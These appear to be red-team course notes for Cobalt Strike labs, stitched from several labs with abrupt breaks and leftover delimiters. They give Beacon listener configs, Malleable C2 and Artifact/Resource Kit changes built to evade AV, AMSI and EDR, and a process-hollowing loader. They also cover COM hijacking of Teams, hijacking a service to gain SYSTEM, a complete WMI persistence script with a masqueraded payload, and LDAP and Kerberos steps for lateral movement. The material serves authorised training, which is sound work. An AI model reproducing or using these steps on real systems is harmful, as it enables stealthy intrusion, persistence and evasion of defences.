## Overview

This is the foundational CS lab. Everything built here (listeners, payloads) is reused throughout the entire course and exam. Get these configs right once and they carry forward.

---

## Step 1 — Connect to Team Server

\`\`\`
Host:     10.0.0.5
Port:     50050
Password: Passw0rd!
\`\`\`

> In a real engagement the team server lives on a VPS, not on the local network. The attacker desktop connects to it over the internet (or a VPN). The team server is what beacons call back to.

---

## Step 2 — Listeners

Listeners define **how Beacon communicates back** to the team server. Each listener type serves a different purpose in the attack chain.

### HTTP Listener

\`\`\`
Name:              http
Payload:           Beacon HTTP
HTTP Hosts:        www.bleepincomputer.com
HTTP Host (Stager): www.bleepincomputer.com
\`\`\`

**Purpose:** Primary egress listener. Beacon checks in over HTTP.
**OPSEC note:** The HTTP host header is set to \`www.bleepincomputer.com\` — this is the Malleable C2 redirect. Traffic looks like a legitimate web request to a known site rather than a raw IP callback.

---

### SMB Listener

\`\`\`
Name:     smb
Payload:  Beacon SMB
Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
\`\`\`

**Purpose:** Peer-to-peer lateral movement. SMB Beacons don't call back to the team server directly — they communicate through a parent Beacon over a named pipe.
**When to use:** After lateral movement (\`jump\`, \`psexec\`, \`scshell\`) to machines that can't reach the internet directly. The parent Beacon relays traffic.
**OPSEC note:** No new outbound connections from the target — traffic rides existing SMB. Much stealthier than HTTP on internal hosts.

---

### TCP Listener (External)

\`\`\`
Name:    tcp
Payload: Beacon TCP
Port:    4444
Bind:    False (all interfaces)
\`\`\`

**Purpose:** Peer-to-peer over TCP. Similar to SMB but uses TCP instead of named pipes.
**When to use:** Environments where SMB is restricted or filtered between hosts.
**Bind to localhost: False** = listens on all interfaces, allowing connections from other machines.

---

### TCP Listener (Local)

\`\`\`
Name:    tcp-local
Payload: Beacon TCP
Port:    1337
Bind:    True (localhost only)
\`\`\`

**Purpose:** Local privilege escalation pivots. Used when exploiting a local service or process that needs to call back to Beacon on the same machine.
**Bind to localhost: True** = only accepts connections from \`127.0.0.1\`. Safer — can't be reached from the network.
**Common use case:** SweetPotato, PrintSpoofer, and other local privesc tools that execute a payload on the same host.

---

## Listener Comparison

| Listener | Transport | Use Case | Outbound Traffic |
|---|---|---|---|
| \`http\` | HTTP | Primary C2 egress | Yes — to team server |
| \`smb\` | Named Pipe | Post-lateral movement (internal) | No — through parent Beacon |
| \`tcp\` | TCP | Post-lateral movement (SMB restricted) | No — through parent Beacon |
| \`tcp-local\` | TCP (127.0.0.1) | Local privesc payload callbacks | No — localhost only |

---

## Step 3 — Generate Payloads

\`\`\`
Payloads > Windows Stageless Generate All Payloads
Output folder: C:\\Payloads
\`\`\`

**Stageless vs Staged:**
- **Stageless** — the full Beacon is embedded in the payload. Larger file but no second-stage download needed. More reliable and better for OPSEC (no stager network request).
- **Staged** — small stager that downloads the full Beacon at runtime. Smaller file but makes an additional network request that can be detected.

CRTO uses stageless throughout. On real engagements stageless is generally preferred.

**Key payloads generated:**

| File | Use |
|---|---|
| \`http_x64.exe\` | Standard HTTP Beacon EXE |
| \`http_x64.xprocess.bin\` | Shellcode for process injection (used in AppDomain hijack) |
| \`smb_x64.exe\` | SMB Beacon EXE for lateral movement |
| \`tcp-local_x64.exe\` | TCP local Beacon for privesc payloads |

---

## Step 4 — Interact with Beacon

Run \`http_x64.exe\` on the target → Beacon checks in → interact via the CS console.

### Essential Beacon Commands

\`\`\`bash
help                    # list all commands
help <command>          # help for specific command
getuid                  # current user context
ps                      # process list
sleep <seconds>         # set check-in interval (lower = noisier)
pwd                     # current directory
ls                      # list directory
upload <file>           # upload file to target
download <file>         # download file from target
shell <cmd>             # run via cmd.exe (spawns process — noisy)
run <cmd>               # run without cmd.exe (slightly quieter)
powershell <cmd>        # run via powershell.exe
powerpick <cmd>         # run PowerShell in-process (no new process — stealthy)
execute-assembly        # run .NET assembly in memory
\`\`\`

> **OPSEC hierarchy:** \`powerpick\` > \`run\` > \`shell\` > \`powershell\`
> Avoid \`shell\` and \`powershell\` where possible — they spawn new processes that are easily detected.

---

## Key Takeaways

- Listeners are set up **once** at the start of an engagement and reused throughout
- SMB and TCP listeners are for **internal** hosts — they chain through a parent HTTP Beacon
- Always use **stageless** payloads in CRTO and on real engagements
- \`tcp-local\` (port 1337, localhost only) is specifically for local privesc techniques like SweetPotato
- The named pipe name for SMB (\`TSVCPIPE-...\`) should be customised in the Malleable C2 profile on real engagements to avoid default CS signatures`},

## Overview

Three layers of evasion are configured in this lab. Each targets a different detection surface:

| Component | What It Modifies | Detection Surface Targeted |
|---|---|---|
| Malleable C2 Profile | Beacon's in-memory signatures & post-ex behaviour | Memory scanning, behavioural detection |
| Artifact Kit | How payloads are built (EXE/DLL templates) | Static AV signatures on disk |
| Resource Kit | PowerShell stager templates | AMSI / script-based detection |

---

## Step 1 — Malleable C2 Profile

SSH into the team server and edit the profile:

\`\`\`bash
ssh attacker@10.0.0.5     # password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile
\`\`\`

Three blocks are added. Each targets a specific detection surface.

---

### \`stage\` Block — In-Memory Beacon Evasion

\`\`\`c
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\\\\\%s: %d" "%s - %s\\\\\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\\\x48\\\\x89..." "\\\\x48\\\\x89...";
    }
}
\`\`\`

**What each setting does:**

| Setting | Purpose |
|---|---|
| \`userwx "false"\` | Don't allocate RWX memory — RWX is a major IOC for memory scanners |
| \`cleanup "true"\` | Free the reflective loader after injection to reduce memory footprint |
| \`copy_pe_header "false"\` | Don't copy the PE header into memory — reduces signature surface |
| \`module_x64 "Hydrogen.dll"\` | Load Beacon into memory carved from a legitimate DLL's address space (module stomping) |
| \`strrep\` directives | Patch known Beacon strings in-memory that AV/EDR vendors signature against |

> **Key concept — Module Stomping:** Instead of allocating fresh memory for Beacon, CS loads a legitimate DLL (\`Hydrogen.dll\`) and overwrites it with Beacon. Memory scanners see a legitimate DLL path rather than anonymous allocated memory.

---

### \`post-ex\` Block — Post-Exploitation Evasion

\`\`\`c
post-ex {
    set spawnto_x64 "%windir%\\\\\\\\sysnative\\\\\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
    }
}
\`\`\`

**What each setting does:**

| Setting | Purpose |
|---|---|
| \`spawnto_x64 "werfault.exe"\` | Post-ex commands spawn into \`werfault.exe\` — a legitimate Windows error reporting process, less suspicious than \`rundll32\` |
| \`cleanup "true"\` | Clean up post-ex artifacts after execution |
| \`pipename "dotnet-diagnostic-..."\` | Named pipe name used for post-ex communication — mimics .NET diagnostic pipes |
| \`thread_hint "ntdll.dll!RtlUserThreadStart+0x2c"\` | Sets the thread's start address to a legitimate ntdll function — bypasses thread start address checks used by EDRs |
| \`amsi_disable "true"\` | Patch AMSI in the post-ex process before running PowerShell/assembly |
| \`strrepex\` directives | Patch known strings in PowerPick and ExecuteAssembly that AV vendors signature |

---

### \`process-inject\` Block — Injection Evasion

\`\`\`c
process-inject {
    set allocator "VirtualAllocEx";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
\`\`\`

**What each setting does:**

| Setting | Purpose |
|---|---|
| \`startrwx "false"\` | Don't start with RWX permissions — allocate RW, write shellcode, then change to RX |
| \`userwx "false"\` | Final memory permissions are RX not RWX — RWX at rest is a major EDR IOC |
| \`bof_reuse_memory "true"\` | Reuse allocated memory for BOF execution rather than allocating fresh each time |
| \`execute\` block | Ordered list of injection techniques CS tries — falls through to next if one fails |
| \`thread_hint\` on CreateThread | Spoofs thread start address to a legitimate ntdll location |

**Restart the team server after saving:**
\`\`\`bash

# If it fails to start, check profile syntax errors:
sudo /usr/bin/docker logs cobaltstrike-cs-1
\`\`\`

## Step 2 — Artifact Kit

Modifies how CS builds EXE/DLL payload templates. The default templates are heavily signatured by AV vendors.

### Modify patch.c

\`\`\`
C:\\Tools\\cobaltstrike\\arsenal-kit\\kits\\artifact\\src-common\\patch.c
\`\`\`

**Line ~45 — svc exe payload loop (XOR decryption, reverse order):**
\`\`\`c
x = length;
while ( x-- ) {
  * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
\`\`\`

**Line ~116 — normal exe payload loop:**
\`\`\`c
int x = length;
while ( x-- ) {
  * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
\`\`\`

> **What this does:** Changes the XOR decryption loop from forward iteration to **reverse order**. AV vendors signature the default forward loop byte pattern. Reversing it breaks the static signature without changing the functional output.

### Build the Artifact Kit

From Ubuntu WSL:
\`\`\`bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
\`\`\`

**Build argument breakdown:**

| Argument | Value | Meaning |
|---|---|---|
| Technique | \`mailslot\` | IPC method used for stager communication |
| Allocator | \`VirtualAlloc\` | Memory allocation method for shellcode |
| Size | \`351363\` | Allocation size |
| RDLL size | \`0\` | Reflective DLL size |
| Bypass | \`false false\` | AMSI/WLDP bypass flags |
| Output | \`/mnt/c/Tools/cobaltstrike/custom-artifacts\` | Output directory |

### Load in Cobalt Strike
\`\`\`
Cobalt Strike > Script Manager > Load
C:\\Tools\\cobaltstrike\\custom-artifacts\\mailslot\\artifact.cna
\`\`\`

## Step 3 — Resource Kit

Modifies the PowerShell stager templates used when delivering payloads via scripted web delivery or PowerShell one-liners.

### Build the Resource Kit

\`\`\`bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
\`\`\`

### Modify template.x64.ps1

\`\`\`
C:\\Tools\\cobaltstrike\\custom-resources\\template.x64.ps1
\`\`\`

**Line 5 — Break string concatenation to evade static AMSI signatures:**
\`\`\`powershell
# Before
.Equals('System.dll')

# After
.Equals('Sys'+'tem.dll')
\`\`\`

**Line 32 — Replace the memory write method:**
\`\`\`powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address kernel32.dll WriteProcessMemory),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))
)
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
\`\`\`

> **Why:** The default template uses a known pattern for resolving and calling \`WriteProcessMemory\`. Replacing it with a dynamic P/Invoke resolution breaks the AMSI signature.

### Modify compress.ps1 — Obfuscation

## Step 2 — AppDomainHijack DLL (Process Hollowing Loader)

**TTP:** T1055.012 — Process Injection: Process Hollowing
**TTP:** T1574.002 — Hijack Execution Flow: DLL Side-Loading

### What AppDomainManager Hijacking Is

.NET applications load an \`AppDomainManager\` if environment variables tell them to. By setting:
\`\`\`
APPDOMAIN_MANAGER_TYPE = AppDomainHijack.DomainManager
APPDOMAIN_MANAGER_ASM  = AppDomainHijack, Version=1.0.0.0, ...
\`\`\`
...any .NET executable will load our DLL and call \`InitializeNewDomain()\` before doing anything else. No code modification of the target binary needed.

\`ngentask.exe\` is a legitimate .NET Framework binary — it loads our DLL automatically when these env vars are set.

### What the DLL Does (Process Hollowing)

The \`InitializeNewDomain()\` method performs classic process hollowing against \`msedge.exe\`:

\`\`\`
1. CreateProcessA(msedge.exe, CREATE_SUSPENDED | CREATE_NO_WINDOW)
       ↓ spawns Edge hidden and suspended
2. NtQueryInformationProcess → get PEB base address
       ↓ read PEB to find image base
3. ReadProcessMemory(PebBaseAddress + 0x10)
       ↓ read image base address from PEB
4. ReadProcessMemory(baseAddress, 512 bytes)
       ↓ read PE headers to find entry point
5. Parse e_lfanew (0x3C) → RVA offset (e_lfanew + 0x28) → calculate entry point VA
       ↓ locate where to write shellcode
6. WriteProcessMemory(lpEntryPoint, shellcode)
       ↓ overwrite entry point with Beacon shellcode
7. ResumeThread(pi.hThread)
       ↓ Edge resumes → executes Beacon shellcode → checks in
\`\`\`

### PE Header Parsing (Key Offsets)

| Offset | Field | Purpose |
|---|---|---|
| \`0x3C\` | \`e_lfanew\` | Pointer to PE header (NT Headers) |
| \`e_lfanew + 0x28\` | \`AddressOfEntryPoint\` RVA | Relative virtual address of entry point |
| \`ImageBase + RVA\` | Entry point VA | Absolute address to write shellcode to |

## Step 3 — COM Hijack via Registry

**TTP:** T1546.015 — Event Triggered Execution: Component Object Model Hijacking

### How COM Hijacking Works

Windows resolves COM objects (CLSIDs) in a specific order:
\`\`\`
1. HKCU\\Software\\Classes\\CLSID\\{CLSID}   ← checked FIRST, user-writable
2. HKLM\\Software\\Classes\\CLSID\\{CLSID}   ← system-wide, requires admin
\`\`\`

If a CLSID entry exists in \`HKCU\`, Windows loads it **instead of** the system-wide \`HKLM\` entry — no admin required, no modification of system files.

### Registry Entries

\`\`\`
# Set the DLL path for the hijacked CLSID
reg_set HKCU "Software\\Classes\\CLSID\\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\\Microsoft\\TeamsMeetingAdd-in\\1.25.14205\\x64\\Microsoft.Teams.HttpClient.dll"

# Set the threading model
reg_set HKCU "Software\\Classes\\CLSID\\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\\InprocServer32" "ThreadingModel" REG_SZ "Both"
\`\`\`

**Key fields explained:**

| Field | Value | Purpose |
|---|---|---|
| CLSID | \`{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\` | The COM object Teams loads at startup |
| Default value | Path to our DLL | Tells Windows where to load \`InprocServer32\` from |
| \`ThreadingModel\` | \`Both\` | Required for COM servers — \`Both\` means the object can be called from any thread (STA or MTA). Without this the COM load may fail |
| \`REG_EXPAND_SZ\` | Used for the path | Allows \`%LocalAppData%\` environment variable expansion |

> **Why \`%LocalAppData%\` instead of a hardcoded path:** Environment variables make the registry entry portable across user profiles and survive path changes — more reliable and slightly harder to spot in static analysis.

### Trigger

\`\`\`
Victim opens Microsoft Teams
    ↓
Teams requests COM object {7D096C5F-...}
    ↓
Windows checks HKCU first → finds our entry
    ↓
Loads Microsoft.Teams.HttpClient.dll from the Add-in directory
    ↓
DLL executes InitializeNewDomain / DllMain → Beacon fires
    ↓
New Beacon appears running inside ms-teams.exe
\`\`\`

---

## Why This Technique Is Effective

| Property | Detail |
|---|---|
| **No admin required** | HKCU is always user-writable |
| **No system file modification** | Nothing in HKLM or System32 is touched |
| **Trusted process** | Beacon runs inside signed Microsoft binary (\`ms-teams.exe\`) |
| **Natural trigger** | Teams launches on login for most corporate users — persistence fires automatically |
| **Blends in** | DLL name and location match legitimate Teams files |
| **Survives reboots** | Registry entry persists across sessions |

| Filter | Purpose |
|---|---|
| \`AccessControlType -eq 'Allow'\` | Only explicit allow ACEs |
| \`IsInherited -eq $false\` | Only explicitly set permissions, not inherited from parent key |
| \`$lowpriv -contains $ace.IdentityReference\` | Check if the ACE grants rights to a low-priv group |
| \`RegistryRights -eq FullControl\` | Only care about full control — read-only is not exploitable |

**Why \`Windows Service EXE\` output specifically:**

Services are started by the Service Control Manager (SCM), which expects a binary that calls \`RegisterServiceCtrlHandler\` and enters a service loop. A standard EXE payload won't satisfy the SCM and the service start will fail/time out. The service EXE wrapper handles the SCM handshake and then executes the Beacon shellcode.

\`\`\`bash

sc_stop BadWindowsService

# Stage payload in a writable directory

# Check current binary path (document it — needed for restore)
sc_qc BadWindowsService

# Redirect service to our payload
sc_config BadWindowsService C:\\Temp\\http_x64.svc.exe 0 2

# Start service → executes as SYSTEM → Beacon checks in elevated
sc_start BadWindowsService

\`\`\`

|---|---|---|
| \`binary_path\` | \`C:\\Temp\\http_x64.svc.exe\` | Path to our malicious service binary |
| \`start_type\` | \`0\` | Boot start (0=Boot, 1=System, 2=Auto, 3=Manual, 4=Disabled) |
| \`error_control\` | \`2\` | Severe — SCM will attempt restart on failure |

> **Why services run as SYSTEM:** By default, Windows services run under \`NT AUTHORITY\\SYSTEM\` unless explicitly configured otherwise. That's what makes misconfigured service permissions such a reliable privesc path.

- Restoring the service to a working state follows *primum non nocere* — the client's environment should function normally after your actions

## The Full Chain

\`\`\`
Generate DNS Beacon payload (dns_x64.exe)
    ↓
Upload + rename to windbg.exe (masquerades as legitimate debugger)
    ↓
Import WmiPersistence.ps1 into Beacon
    ↓
psinject → run Add-WmiPersistence in Beacon process context
    ↓
WMI subscription created: EventFilter + Consumer + Binding
    ↓
gpupdate /force → fires Win32_NTLogEvent 1502 → WMI triggers
    ↓
windbg.exe (dns_x64.exe) executes as SYSTEM → DNS Beacon checks in
    ↓
Remove-WmiPersistence → cleanup
\`\`\`

---

## Step 1 — Generate a DNS Payload

\`\`\`
Payloads > Windows Stageless Payload
Listener: dns
Output:   Windows EXE
Save to:  C:\\Payloads\\dns_x64.exe
\`\`\`

**Why DNS listener for persistence:**

| Listener | Why Used Here |
|---|---|
| HTTP | Requires direct HTTP egress — may be blocked or logged |
| DNS | Uses DNS queries for C2 — harder to block without breaking name resolution, survives network changes |
| SMB | Peer-to-peer only — not suitable for a standalone persistence trigger |

> DNS Beacons are slower (higher latency callbacks) but significantly more resilient for persistence scenarios — they survive reboots, network changes, and environments where HTTP egress is restricted.

---

## Step 2 — Stage the Payload

From the SYSTEM Beacon:

\`\`\`bash
upload C:\\Payloads\\dns_x64.exe
mv dns_x64.exe windbg.exe
\`\`\`

**Why rename to \`windbg.exe\`:**
- \`windbg.exe\` is a legitimate Microsoft Windows Debugger binary
- The WMI consumer command line \`C:\\Windows\\System32\\windbg.exe -trace\` looks like a normal debugging diagnostic invocation
- An analyst reviewing the WMI subscription sees a plausible system-level debugging task rather than an obvious payload name
- **MITRE:** T1036.005 — Masquerading: Match Legitimate Name or Location

> On real engagements, place the renamed payload in a path consistent with the masquerade — \`C:\\Windows\\System32\\\` requires SYSTEM (which you have), and makes the path completely convincing.

---

## Step 3 — WMI Event Subscription

**TTP:** T1546.003 — Event Triggered Execution: Windows Management Instrumentation Event Subscription

WMI persistence consists of three components that must all be created and linked:

\`\`\`
__EventFilter          → defines WHEN to trigger (the condition)
CommandLineEventConsumer → defines WHAT to run (the action)
__FilterToConsumerBinding → links filter to consumer
\`\`\`

All three are stored in \`root/subscription\` namespace and persist across reboots — they live in the WMI repository (\`C:\\Windows\\System32\\wbem\\Repository\`), not the registry or filesystem.

### The Script

\`\`\`powershell
# Save to C:\\Tools\\WmiPersistence.ps1

function Add-WmiPersistence
{
   $EventFilterArgs = @{
      EventNamespace = 'root/cimv2'
      Name = "Debug Trace"
      Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
      QueryLanguage = 'WQL'
   }

   $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

   $CommandLineConsumerArgs = @{
      Name = "Debug Consumer"
      CommandLineTemplate = "C:\\Windows\\System32\\windbg.exe -trace"
   }

   $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

   $FilterToConsumerArgs = @{
      Filter = $Filter
      Consumer = $Consumer
   }

   Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
}

function Remove-WmiPersistence
{
    Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
}
\`\`\`

### EventFilter Breakdown

\`\`\`wql
SELECT * FROM __InstanceCreationEvent WITHIN 5
WHERE TargetInstance ISA 'Win32_NTLogEvent'
AND TargetInstance.EventCode = '1502'
\`\`\`

| Component | Value | Meaning |
|---|---|---|
| \`__InstanceCreationEvent\` | — | Fires when a new WMI instance is created (i.e. a new log event appears) |
| \`WITHIN 5\` | 5 seconds | Polling interval — WMI checks for the condition every 5 seconds |
| \`Win32_NTLogEvent\` | — | Watches Windows Event Log entries |
| \`EventCode = '1502'\` | — | Event ID 1502 = Group Policy successfully applied — fires on every \`gpupdate\` |

> **Why Event ID 1502:** It's a reliable, predictable trigger that fires on every Group Policy refresh — which happens automatically every ~90 minutes on domain-joined machines. No user interaction required for recurring execution.

### Consumer Breakdown

\`\`\`powershell
CommandLineTemplate = "C:\\Windows\\System32\\windbg.exe -trace"
\`\`\`

\`CommandLineEventConsumer\` executes a command line when the filter fires. The command runs as **SYSTEM** in session 0 — the same context as the WMI service itself.

### Binding

The \`__FilterToConsumerBinding\` links the filter and consumer together. Without this, the filter and consumer exist independently but never interact.

---

## Step 4 — Install via psinject

\`\`\`bash
# Import the script into Beacon's memory
powershell-import C:\\Tools\\WmiPersistence.ps1

# Inject and run Add-WmiPersistence in the Beacon process
psinject [BEACON_PID] x64 Add-WmiPersistence
\`\`\`

**Why \`psinject\` instead of \`powerpick\`:**

| Command | Execution Context | Use When |
|---|---|---|
| \`powerpick\` | Runs in a spawned post-ex process | Standard in-memory PowerShell execution |
| \`psinject\` | Injects into a **specific existing process** by PID | When you need execution in a particular process context (e.g. SYSTEM process for WMI operations) |

> Using \`psinject\` with the SYSTEM Beacon PID ensures the WMI subscription is created with SYSTEM privileges — required for writing to \`root/subscription\`.

---

## Step 5 — Trigger and Verify

\`\`\`bash
# Trigger Group Policy refresh → fires EventCode 1502 → WMI executes windbg.exe
execute gpupdate /target:computer /force
\`\`\`

Expected result: New DNS Beacon appears within a few seconds running as SYSTEM.

> On a real engagement you wouldn't need to manually trigger this — the subscription fires automatically on the next scheduled Group Policy refresh (~90 minutes). Manual triggering is just for lab verification.

---

## Step 6 — Cleanup

\`\`\`bash
psinject [BEACON_PID] x64 Remove-WmiPersistence
\`\`\`

**What \`Remove-WmiPersistence\` deletes:**
- \`__EventFilter\` where \`Name='Debug Trace'\`
- \`CommandLineEventConsumer\` where \`Name='Debug Consumer'\`
- \`__FilterToConsumerBinding\` where path contains \`Debug\`

> Always remove all three components. Leaving a \`FilterToConsumerBinding\` with a dangling reference or an orphaned \`__EventFilter\` is detectable and can cause WMI instability.

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1546.003 | WMI Event Subscription | EventFilter + Consumer + Binding in root/subscription |
| T1036.005 | Masquerading: Match Legitimate Name | dns_x64.exe renamed to windbg.exe |
| T1071.004 | Application Layer Protocol: DNS | DNS Beacon for C2 callbacks |
| T1070 | Indicator Removal | Remove-WmiPersistence cleans all three WMI objects |

---

## Key Takeaways

- WMI subscriptions live in the **WMI repository**, not the registry or filesystem — most registry-focused persistence hunters miss them entirely
- All three objects (\`__EventFilter\`, \`CommandLineEventConsumer\`, \`__FilterToConsumerBinding\`) must be created **and** bound — missing any one breaks the chain silently
- \`WITHIN 5\` is the polling interval — lower values mean faster triggering but more WMI overhead; 5 seconds is a reasonable balance
- Event ID 1502 is ideal as a trigger — fires automatically every ~90 minutes without user interaction on any domain-joined machine
- \`psinject\` into the SYSTEM Beacon PID is required — \`powerpick\` would run in a spawned process that may not have the right privilege context for \`root/subscription\` writes
- DNS listener is the right choice for persistence payloads — survives network changes and HTTP egress restrictions
- Always implement \`Remove-WmiPersistence\` before the engagement — cleanup is not optional`},

## Step 1 — LDAP Enumeration via BOF (BOFHound Collection)

\`\`\`bash
# Enumerate domain root, OUs, and GPOs + their ACLs
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor

# Enumerate users, computers, and security groups + their ACLs
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
\`\`\`

### Why BOFHound Over SharpHound

| Method | Execution | Detection Risk | Notes |
|---|---|---|---|
| SharpHound | Drops EXE/DLL to disk, spawns new process | High — heavily signatured by AV/EDR | Makes bulk LDAP queries in short bursts |
| BOFHound | Runs ldapsearch BOF in-process inside Beacon | Low — looks like normal LDAP traffic | No new process, no disk artefact |

> The \`ldapsearch\` BOF runs inside Beacon's process — output goes directly to Cobalt Strike's beacon log files on the team server. BOFHound parses those logs offline.

### LDAP Query Breakdown

**Query 1 — Structure and GPOs:**

| Filter | Objects Returned |
|---|---|
| \`objectClass=domain\` | Domain root object |
| \`objectClass=organizationalUnit\` | All OUs |
| \`objectClass=groupPolicyContainer\` | All GPOs (includes \`gPCFileSysPath\` → SysVol path) |

**Query 2 — Principals:**

| samAccountType | Objects Returned |
|---|---|
| \`805306368\` | User accounts |
| \`805306369\` | Computer accounts |
| \`268435456\` | Security groups |

**Why \`ntsecuritydescriptor\` on both queries:**
- \`ntsecuritydescriptor\` is an **operational attribute** — not returned by \`*\` alone, must be explicitly requested
- Contains the raw DACL for every object — this is what gives BloodHound its ACL-based attack path edges (\`GenericAll\`, \`WriteDacl\`, \`WriteProperty\`, \`AdminTo\`, etc.)
- Without it, BOFHound produces object data but no ACL-based edges

## Step 6 — Download GptTmpl.inf from SysVol

**Why this step is necessary:**
BloodHound (via BOFHound) has no way to know that Workstation Admins has local admin rights on the workstations — that relationship is defined in the GPO's **security template** stored in SysVol, not in LDAP. It must be read manually.

\`\`\`bash

ls \\\\contoso.com\\SysVol\\contoso.com\\Policies\\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\\Machine\\Microsoft\\Windows NT\\SecEdit\\

# Download GptTmpl.inf
download \\\\contoso.com\\SysVol\\contoso.com\\Policies\\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf

**Sync from CS:**
\`\`\`
Cobalt Strike → View → Downloads → Sync Files

### What to Look For in GptTmpl.inf

The \`[Group Membership]\` section defines Restricted Groups — which domain groups are pushed into local groups on target machines:

\`\`\`ini
[Group Membership]
*S-1-5-21-3926355307-1661546229-813047887-1106__Memberof = *S-1-5-32-544
\`\`\`

| SID | Meaning |
|---|---|
| \`...-1106\` | Workstation Admins group (domain group) |
| \`S-1-5-32-544\` | Built-in Administrators (local group on target machines) |

This confirms Workstation Admins is pushed into the local Administrators group on all machines the GPO applies to → \`AdminTo\` relationship.

## Step 7 — Add Custom AdminTo Edges in BloodHound

BloodHound has the group and computers as objects but no edge between them — add it manually via Cypher:

\`\`\`cypher
# WKSTN-1
MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'})
MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
MERGE (y)-[:AdminTo]->(x)

# WKSTN-2
MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2102'})
MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})
MERGE (y)-[:AdminTo]->(x)
\`\`\`

**After adding edges:** BloodHound now shows rsteel → Workstation Admins → AdminTo → WKSTN-1/2 — the full lateral movement path is visible and queryable.

### Cypher Template for Real Engagements

\`\`\`cypher
# Generic template — swap SIDs for environment
MATCH (x:Computer{objectid:'<COMPUTER_SID>'})
MATCH (y:Group{objectid:'<GROUP_SID>'})
MERGE (y)-[:AdminTo]->(x)
\`\`\`

| TTP | Technique | Detail |

| T1018 | Remote System Discovery | ldapsearch enumerates computers |
| T1069.002 | Domain Groups Discovery | ldapsearch enumerates groups and memberships |
| T1087.002 | Domain Account Discovery | ldapsearch enumerates user accounts |

## Key Takeaways

- **Never use SharpHound on a live engagement** if you can avoid it — BOFHound via ldapsearch BOF is the OPSEC-safe alternative
- \`ntsecuritydescriptor\` must be explicitly requested — it's the attribute that makes BloodHound's ACL edges possible
- **GPO-based local admin relationships are invisible to LDAP** — they live in SysVol \`GptTmpl.inf\` and must be manually read and added as Cypher edges

Proxifier intercepts outbound TCP connections from any process and routes them through a SOCKS proxy transparently — the application doesn't need to be proxy-aware.

Action:       Proxy SOCKS5 10.0.0.5

**What \`runas /netonly\` does:**

| Flag | Behaviour |
|---|---|
| \`/netonly\` | Creates a logon session where local execution uses the current user, but **all network authentication uses the specified credentials** |
| Password | Not validated locally — only used when network auth is attempted (Kerberos takes over via PTT) |

> This is the command-line equivalent of \`make_token\` in Beacon. The \`powershell.exe\` spawned runs locally as your attacker user but presents rsteel's identity (via the injected ticket) for all network operations.

Kerberos tickets are tied to logon sessions. Injecting a ticket into an existing session would affect all processes using it. \`runas /netonly\` creates an isolated session so the ticket is scoped to this specific PowerShell instance only.

|---|---|---|
| \`/service\` | \`ldap/lon-dc-1\` | SPN of the service ticket to request — LDAP on lon-dc-1 |
| \`/ticket\` | Base64 TGT | rsteel's TGT used to authenticate to the KDC for the TGS-REQ |
